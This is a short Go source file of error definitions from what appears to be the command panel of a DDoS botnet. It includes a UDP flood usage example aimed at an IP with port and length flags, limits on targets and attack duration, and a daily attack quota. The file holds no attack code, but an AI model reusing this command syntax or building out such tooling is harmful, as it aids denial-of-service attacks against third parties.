package attacks

import (
	"errors"
)

var (
	ErrNotEnoughArgs = errors.New("invalid arguments.\r\nexample: ./udp 70.70.70.72 60 dport=80 len=1")

	ErrTooManyTargets   = errors.New("cannot specify more than 255 targets in a single attack")
	ErrInvalidHost      = errors.New("invalid target, example: 70.70.70.72,70.70.70.0/24")
	ErrInvalidDuration  = errors.New("invalid duration. duration must be 1-60 seconds")
	ErrBlankTarget      = errors.New("blank target specified")
	ErrTooManySlashes   = errors.New("too many /'s in prefix")
	ErrInvalidCidr      = errors.New("invalid cidr")
	ErrBlankDuration    = errors.New("please specify an attack duration")
	ErrInvalidKeyVal    = errors.New("invalid key=value flag combination")
	ErrInvalidFlag      = errors.New("invalid flag key")
	ErrTooManyFlags     = errors.New("cannot have more than 255 flags")
	ErrTooManyFlagBytes = errors.New("flag value cannot be more than 255 bytes")
	ErrNoAttacksLeft    = errors.New("you have exceeded your daily attack limit")
	ErrAttacksDisabled  = errors.New("attacks are currently disabled")
)
